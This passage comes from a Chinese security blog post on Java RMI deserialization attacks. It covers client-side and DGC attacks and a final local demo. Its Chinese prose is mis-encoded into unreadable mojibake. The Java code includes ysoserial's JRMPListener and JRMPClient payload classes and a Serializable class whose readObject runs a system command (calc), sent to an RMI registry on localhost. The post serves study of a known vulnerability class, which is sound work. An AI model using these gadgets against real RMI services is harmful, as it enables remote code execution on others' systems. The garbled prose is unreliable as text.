class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ Registry ç«¯å…·æœ‰ç›¸åº”çš„ä¾èµ–åŠç›¸åº” JDK ç‰ˆæœ¬éœ€æ±‚ã€‚</p><p>è¿™ä¸ªæ”»å‡»æ‰‹æ®µå®é™…ä¸Šå°±æ˜¯ ysoserial ä¸­çš„ <strong>ysoserial.exploit.RMIRegistryExploit</strong> çš„å®ç°åŸç†ã€‚</p><p>é™¤äº† bindï¼Œç”±äº lookup&#x2F;rebind ç­‰æ–¹æ³•å‡é€šè¿‡ååºåˆ—åŒ–ä¼ é€’æ•°æ®ï¼Œå› æ­¤æ­¤å¤„çš„å®é™…æ”»å‡»æ‰‹æ®µä¸æ­¢ bind ä¸€ç§ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåä¹‰ä¸Šçš„ Server ç«¯å’Œ Client ç«¯éƒ½å¯ä»¥æ”»å‡» Registry ç«¯ã€‚</p><h3 id="Client-ç«¯-Attack"><a href="#Client-ç«¯-Attack" class="headerlink" title="Client ç«¯ Attack"></a>Client ç«¯ Attack</h3><p>å¦‚æœæ”»å‡»çš„ç›®æ ‡ä½œä¸º Client ç«¯ï¼Œä¹Ÿå°±æ˜¯åœ¨ Registry åœ°å€å¯æ§ï¼Œæˆ– Registry&#x2F;Server ç«¯å¯æ§ï¼Œä¹Ÿæ˜¯å¯ä»¥å¯¼è‡´æ”»å‡»çš„ã€‚å®¢æˆ·ç«¯ä¸»è¦æœ‰ä¸¤ä¸ªäº¤äº’è¡Œä¸ºï¼Œç¬¬ä¸€æ˜¯ä» Registry ç«¯è·å–è°ƒç”¨æœåŠ¡çš„ stub å¹¶ååºåˆ—åŒ–ï¼Œç¬¬äºŒæ­¥æ˜¯è°ƒç”¨æœåŠ¡åè·å–æ‰§è¡Œç»“æœå¹¶ååºåˆ—åŒ–ã€‚</p><p>è¿™éƒ¨åˆ†æ”»å‡»å®æˆ˜æ„ä¹‰è¾ƒå°‘ï¼Œå¹¶ä¸”ä¸ä¸Šè¿°è®¨è®ºçš„æ”»å‡» Server ç«¯å’Œ Registry ç«¯çš„æ”»å‡»éƒ½æ˜¯é•œåƒè¡Œä¸ºï¼Œæ‰€ä»¥è¿™é‡Œç®€å•æè¿°ä¸€ä¸‹æµç¨‹å°±ä¸å†æ¼”ç¤ºäº†ã€‚</p><p>å®¢æˆ·ç«¯çš„æ”»å‡»å’Œä¸Šé¢çš„éƒ½ç±»ä¼¼ï¼Œå¤§æ¦‚å°±ä¸‹é¢å‡ ä¸ªæ”»å‡»ç‚¹</p><ul><li>æ¶æ„Serverè¿”å›æ–¹æ³•è°ƒç”¨ç»“æœ</li><li>æ¶æ„Server(Registry)è¿”å›Stub</li><li>åŠ¨æ€ç±»åŠ è½½ï¼ˆServerè¿”å›çš„è°ƒç”¨ç»“æœè‹¥ä¸ºå®¢æˆ·ç«¯ä¸å­˜åœ¨çš„ç±»ï¼Œå®¢æˆ·ç«¯ä¹Ÿæ”¯æŒåŠ¨æ€åŠ è½½ï¼‰</li></ul><h3 id="DGC-Attack"><a href="#DGC-Attack" class="headerlink" title="DGC Attack"></a>DGC Attack</h3><p><strong>DGCï¼ˆDistributed Garbage Collectionï¼‰</strong>â€”â€” åˆ†å¸ƒå¼åƒåœ¾å›æ”¶ï¼Œå½“ Server ç«¯è¿”å›ä¸€ä¸ªå¯¹è±¡åˆ° Client ç«¯ï¼ˆè¿œç¨‹æ–¹æ³•çš„è°ƒç”¨æ–¹ï¼‰æ—¶ï¼Œå…¶è·Ÿè¸ªè¿œç¨‹å¯¹è±¡åœ¨ Client ç«¯ä¸­çš„ä½¿ç”¨ã€‚å½“å†æ²¡æœ‰æ›´å¤šçš„å¯¹ Client è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨æ—¶ï¼Œæˆ–è€…å¦‚æœå¼•ç”¨çš„â€œç§Ÿå€Ÿâ€è¿‡æœŸå¹¶ä¸”æ²¡æœ‰æ›´æ–°ï¼ŒæœåŠ¡å™¨å°†åƒåœ¾å›æ”¶è¿œç¨‹å¯¹è±¡ã€‚å¯åŠ¨ä¸€ä¸ª RMI æœåŠ¡ï¼Œå°±ä¼šä¼´éšç€ DGC æœåŠ¡ç«¯çš„å¯åŠ¨ã€‚</p><p>RMI å®šä¹‰äº†ä¸€ä¸ª <code>java.rmi.dgc.DGC</code> æ¥å£ï¼Œæä¾›äº†ä¸¤ä¸ªæ–¹æ³• <code>dirty</code> å’Œ <code>clean</code>ï¼š</p><ul><li>å®¢æˆ·ç«¯æƒ³è¦ä½¿ç”¨æœåŠ¡ç«¯ä¸Šçš„è¿œç¨‹å¼•ç”¨ï¼Œä½¿ç”¨ <code>dirty</code> æ–¹æ³•æ¥æ³¨å†Œä¸€ä¸ªã€‚åŒæ—¶è¿™è¿˜è·Ÿç§Ÿæˆ¿å­ä¸€æ ·ï¼Œè¿‡æ®µæ—¶é—´ç»§ç»­ç”¨çš„è¯è¿˜è¦å†è°ƒç”¨ä¸€æ¬¡æ¥ç»­ç§Ÿã€‚</li><li>å®¢æˆ·ç«¯ä¸ä½¿ç”¨çš„æ—¶å€™ï¼Œéœ€è¦è°ƒç”¨ <code>clean</code> æ–¹æ³•æ¥æ¸…æ¥šè¿™ä¸ªè¿œç¨‹å¼•ç”¨ã€‚</li></ul><p>è¿™ä¸ªæ¥å£æœ‰ä¸¤ä¸ªå®ç°ç±»ï¼Œåˆ†åˆ«æ˜¯ <code>sun.rmi.transport.DGCImpl</code> ä»¥åŠ <code>sun.rmi.transport.DGCImpl_Stub</code>ï¼ŒåŒæ—¶è¿˜å®šä¹‰äº† <code>sun.rmi.transport.DGCImpl_Skel</code>ã€‚</p><p>è¿™ä¸ªå‘½åæ–¹å¼çœ‹ç€ç¡®å®éå¸¸çœ¼ç†Ÿã€‚</p><p>æ²¡é”™ï¼Œå¾ˆåƒ Registryã€RegistryImplã€RegistryImpl_Stubã€RegistryImpl_Skelï¼Œå®é™…ä¸Šä¸å•æ˜¯å‘½åç›¸è¿‘ï¼Œå¤„ç†é€»è¾‘ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚é€šè¿‡åœ¨æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¹‹é—´ä¼ é€’å¼•ç”¨ï¼Œä¾æ—§æ˜¯ Stub ä¸ Skel ä¹‹é—´çš„é€šä¿¡æ¨¡å¼ï¼šServer ç«¯å¯åŠ¨ DGCImplï¼Œåœ¨ Registry ç«¯æ³¨å†Œ DGCImpl_Stub ï¼ŒClient ç«¯è·å–åˆ° DGCImpl_Stubï¼Œé€šè¿‡å…¶ä¸ Server ç«¯é€šä¿¡ï¼ŒServer ç«¯ä½¿ç”¨ RegistryImpl_Skel æ¥å¤„ç†ã€‚</p><p>æ”»å‡»æ‰‹æ®µå°±æ˜¯</p><p>DGCImpl_Stub#dirty</p><p>DGCImpl_Skel#dispatch</p><p>è§ysoserialçš„<code>exploit.JRMPListener</code>å’Œ<code>exploit.JRMPClient</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPListener</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PayloadRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;UnicastRemoteObject&gt; &#123;<br><br>    <span class="hljs-keyword">public</span> UnicastRemoteObject <span class="hljs-title function_">getObject</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String command )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">jrmpPort</span> <span class="hljs-operator">=</span> Integer.parseInt(command);<br>        <span class="hljs-type">UnicastRemoteObject</span> <span class="hljs-variable">uro</span> <span class="hljs-operator">=</span> Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>            RemoteRef.class<br>        &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastServerRef</span>(jrmpPort)<br>        &#125;);<br><br>        Reflections.getField(UnicastRemoteObject.class, <span class="hljs-string">&quot;port&quot;</span>).set(uro, jrmpPort);<br>        <span class="hljs-keyword">return</span> uro;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        PayloadRunner.run(JRMPListener.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPClient</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PayloadRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Registry&gt; &#123;<br><br>    <span class="hljs-keyword">public</span> Registry <span class="hljs-title function_">getObject</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String command )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        String host;<br>        <span class="hljs-type">int</span> port;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">sep</span> <span class="hljs-operator">=</span> command.indexOf(<span class="hljs-string">&#x27;:&#x27;</span>);<br>        <span class="hljs-keyword">if</span> ( sep &lt; <span class="hljs-number">0</span> ) &#123;<br>            port = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">65535</span>);<br>            host = command;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            host = command.substring(<span class="hljs-number">0</span>, sep);<br>            port = Integer.valueOf(command.substring(sep + <span class="hljs-number">1</span>));<br>        &#125;<br>        <span class="hljs-type">ObjID</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjID</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt()); <span class="hljs-comment">// RMI registry</span><br>        <span class="hljs-type">TCPEndpoint</span> <span class="hljs-variable">te</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPEndpoint</span>(host, port);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LiveRef</span>(id, te, <span class="hljs-literal">false</span>));<br>        <span class="hljs-type">RemoteObjectInvocationHandler</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjectInvocationHandler</span>(ref);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>            Registry.class<br>        &#125;, obj);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());<br>        PayloadRunner.run(JRMPClient.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ”»å‡»çš„gadgetåˆ† UnicastRemoteObjectã€UnicastRefå’ŒRemoteObjectä¸‰ç§ã€‚è¿™é‡Œä¸åšè¿‡å¤šè§£é‡Šã€‚</p><p>æ€»ç»“ä¸º</p><ul><li>exploit<ul><li>JRMPListnerï¼šæ„é€ æ¶æ„JRMPæœåŠ¡å™¨ï¼Œè¿”å›å¼‚å¸¸è®©å®¢æˆ·ç«¯ååºåˆ—åŒ– <code>StreamRemoteCall#executeCall</code></li><li>JRMPClientï¼šå‘é€æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œæ‰“DGCæœåŠ¡ <code>DGCImpl_Skel#dispatch</code></li></ul></li><li>payloads<ul><li>JRMPListnerï¼š<code>UnicastRemoteObject</code>ååºåˆ—åŒ–æ—¶ä¼šå¯¼å‡ºå¯¹è±¡ï¼Œè§¦å‘JRMPç›‘å¬ç«¯å£ï¼Œé…åˆexploit.JRMPClientæ‰“</li><li>JRMPClientï¼š<code>UnicastRef</code>ååºåˆ—åŒ–æ—¶ä¼šè§¦å‘DGCçš„<code>ditry</code>ï¼Œé…åˆexploit.JRMPListneræ‰“</li></ul></li></ul><h2 id="Final-Test"><a href="#Final-Test" class="headerlink" title="Final Test"></a>Final Test</h2><p>æœ€åæµ…æµ…æ‰“ä¸€ä¸ªç®€å•ä½¿ç”¨RMIæœåŠ¡è°ƒç”¨è¿œç¨‹å¯¹è±¡ååºåˆ—åŒ–å¼¹calcä½œä¸ºæˆ‘æœ€åçš„ç»“æŸå§ï¼ŒJEP 290çš„bypassæ”¾åœ¨åé¢æ–‡ç« å†è¿›è¡Œå¤ç°ã€‚JNDIä¹ŸåŒæ ·ä¼šæ”¾åœ¨åé¢å†è¯¦ç»†å¤ç›˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream objectInputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        objectInputStream.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">RMITestImpl</span> <span class="hljs-variable">rmiTest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMITestImpl</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">8081</span>);<br>        registry.bind(<span class="hljs-string">&quot;EddieMurphy&quot;</span>,rmiTest);<br>        System.out.println(<span class="hljs-string">&quot;RMI Server is listening ...&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NotBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">8081</span>);<br>        <span class="hljs-type">RMITest</span> <span class="hljs-variable">rmiTest</span> <span class="hljs-operator">=</span> (RMITest) registry.lookup(<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        rmiTest.sayObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">payload</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RMITest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testcalc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayObject</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMITestImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RMITest</span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RMITestImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testcalc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayObject</span><span class="hljs-params">(Object obj)</span> &#123;<br>        System.out.println(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/RMI-JNDI/7.png" alt="7"></p><p>æŠ„äº†ä¸‹<a href="https://blog.csdn.net/uuzeray/article/details/135886709?ops_request_misc=%7B%22request_id%22:%22172199251516800186550713%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172199251516800186550713&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-135886709-null-null.nonecase&utm_term=RMI&spm=1018.2226.3001.4450">ã€å¿ƒå¾—ã€‘java JNDIé…åˆRMIå®ç°æ³¨å…¥ä¸ªäººç¬”è®°_${jndi:rmi:-CSDNåšå®¢</a>ï¼ˆæˆ‘æ˜¯æ‡’ç‹—ï¼‰</p><p>åŸç†å¾ˆç®€å•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>ã€å®šä¹‰è¿œç¨‹æ¥å£ (RMITest.java):  <br>Â· å®šä¹‰äº†ä¸€ä¸ªè¿œç¨‹æ¥å£ RMITestï¼Œå…¶ä¸­åŒ…å«ä¸¤ä¸ªæ–¹æ³• testcalc() å’Œ sayObject(Object obj)ã€‚<br>è¿™äº›æ–¹æ³•å£°æ˜æŠ›å‡º RemoteExceptionï¼Œä»¥ä¾¿åœ¨è¿œç¨‹è°ƒç”¨æ—¶å¤„ç†å¯èƒ½çš„ç½‘ç»œé—®é¢˜ã€‚<br><br><span class="hljs-number">2</span>ã€å®ç°è¿œç¨‹æ¥å£ (RMITestImpl.java):  <br>Â· RMITestImpl ç±»å®ç°äº† RMITest æ¥å£ï¼Œå¹¶ç»§æ‰¿äº† UnicastRemoteObjectï¼Œä½¿å…¶æˆä¸ºä¸€ä¸ªè¿œç¨‹å¯¹è±¡ã€‚<br>Â· åœ¨ testcalc() æ–¹æ³•ä¸­ï¼Œä½¿ç”¨ Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>) æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¼¹å‡ºè®¡ç®—å™¨ã€‚<br>Â· sayObject(Object obj) æ–¹æ³•ç®€å•åœ°æ‰“å°ä¼ å…¥çš„å¯¹è±¡ã€‚<br><br><span class="hljs-number">3</span>ã€åˆ›å»ºå¹¶å¯åŠ¨RMIæœåŠ¡å™¨ (RMIServer.java):  <br>Â· åœ¨ main æ–¹æ³•ä¸­ï¼Œåˆ›å»º RMITestImpl çš„å®ä¾‹ã€‚<br>Â· ä½¿ç”¨ LocateRegistry.createRegistry(<span class="hljs-number">8081</span>) åˆ›å»ºä¸€ä¸ªåœ¨ç«¯å£ <span class="hljs-number">8081</span> ä¸Šç›‘å¬çš„ RMI æ³¨å†Œè¡¨ã€‚<br>Â· å°† RMITestImpl å®ä¾‹ç»‘å®šåˆ°æ³¨å†Œè¡¨ä¸­ï¼Œåç§°ä¸º <span class="hljs-string">&quot;EddieMurphy&quot;</span>ã€‚<br>Â· æ‰“å°ä¸€æ¡æ¶ˆæ¯è¡¨ç¤ºæœåŠ¡å™¨æ­£åœ¨ç›‘å¬ã€‚<br><br><span class="hljs-number">4</span>ã€åˆ›å»ºå¹¶å¯åŠ¨RMIå®¢æˆ·ç«¯ (RMIClient.java):  <br>Â· åœ¨ main æ–¹æ³•ä¸­ï¼Œä½¿ç”¨ LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">8081</span>) è·å–æœåŠ¡å™¨çš„æ³¨å†Œè¡¨ã€‚<br>Â· ä½¿ç”¨ registry.lookup(<span class="hljs-string">&quot;EddieMurphy&quot;</span>) æŸ¥æ‰¾è¿œç¨‹å¯¹è±¡ï¼Œå¹¶å°†å…¶å¼ºåˆ¶è½¬æ¢ä¸º RMITest æ¥å£ã€‚<br>Â· è°ƒç”¨ rmiTest.sayObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">payload</span>()) æ–¹æ³•ï¼Œä¼ é€’ä¸€ä¸ª payload å¯¹è±¡ã€‚<br>Â· è°ƒç”¨ rmiTest.testcalc() æ–¹æ³•ï¼Œæ‰§è¡Œè¿œç¨‹æ–¹æ³•ï¼Œå¼¹å‡ºè®¡ç®—å™¨ã€‚<br></code></pre></td></tr></table></figure><p>åç»­çš„JNDIæ˜¯é‡å¤´æˆï¼Œlookupæ˜¯å…¸å‹çš„ç‰¹å¾ã€‚é‚£ä¹ˆJNDIç»“åˆRMIæ‰“æ³•å°±å…ˆç•™å¾…æŠ›ç –å¼•ç‰å§ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/prerequisites/rmi-and-jndi/rmi">RMI | Java (gitbook.io)</a></p><p><a href="https://su18.org/post/rmi-attack/">Java RMI æ”»å‡»ç”±æµ…å…¥æ·± | ç´ åå…« (su18.org)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
